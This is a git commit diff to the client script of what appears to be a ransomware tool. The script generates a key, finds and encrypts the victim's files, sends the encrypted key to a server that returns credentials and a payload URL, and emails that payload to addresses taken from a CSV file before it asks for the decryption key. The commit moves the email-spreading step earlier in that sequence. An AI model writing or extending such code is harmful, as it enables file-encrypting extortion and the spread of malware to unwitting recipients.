996b9d7552d810e5d930440f21342454c41ec9c3
M-Konar <85055466+m-abdelgaber@users.noreply.github.com>
2023-05-15 08:28:01 +0300

    Update client.py

--- src/client.py
+++ src/client.py
@@ -20,12 +20,11 @@ how the pipeline works (when you run the client.exe file):
 from utils import waitingForKey, generate_key, findTxtFileAndSaveThemTo, encrypt_ascii_key_with_server_RSA_and_send_to_server, encrypt_file_paths, saveKey, decrypt_file_paths, get_emails_from_csv, send_to_emails
 
 # Continue with the rest of your program logic
-waitingForKey("start")
 
 #1
 # ascii_key= "vG7pyhyrDzSnqcJ8"
 ascii_key = generate_key(16)
-print("ascii_key vvvv" + ascii_key)
+print("ascii_key vvvv\n" + ascii_key)
 
 #2
 file_contains_paths ="paths.txt"
@@ -33,8 +32,7 @@ findTxtFileAndSaveThemTo( file_contains_paths )
 
 #3
 encoded_encrypted_msg, credentials, payload_url = encrypt_ascii_key_with_server_RSA_and_send_to_server(ascii_key)
-print("credentials" + str(credentials))
-print("payload_url" + str(payload_url))
+
 #4
 encrypt_file_paths(ascii_key, file_contains_paths)
 
@@ -43,18 +41,17 @@ saveKey(ascii_key, "Key.key")
 
 #6
 saveKey(encoded_encrypted_msg.decode(), "encryptedKey.key")
-
 #7
+emails = get_emails_from_csv()
+
+print(emails)
+#8
+send_to_emails(emails, credentials, payload_url)
+print("Payload was sent successfully!")
+
+#9
 waitingForKey(ascii_key, message="Enter the secret key to DECRYPT FILES: ")
 decrypt_file_paths(ascii_key, file_contains_paths)
 
-# 8
-emails = get_emails_from_csv()
 
-
-
-print(emails)
-# 9
-send_to_emails(emails, credentials, payload_url)
-print("Payload was sent successfully!")
 input("Press Any Key To Close...")
